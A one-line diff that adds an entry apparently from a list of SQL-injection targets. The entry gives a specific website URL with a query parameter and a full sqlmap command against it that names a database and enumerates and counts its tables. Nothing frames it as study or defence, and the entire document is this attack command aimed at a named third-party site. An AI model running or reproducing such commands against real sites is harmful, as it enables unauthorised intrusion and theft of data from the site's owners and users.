@@ -1,0 +1,1 @@
+http://www.dyogeneschaves.com.br/includes/obra.php?cod=1 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://www.dyogeneschaves.com.br/includes/obra.php?cod=1 -D dyochaves --tables --count
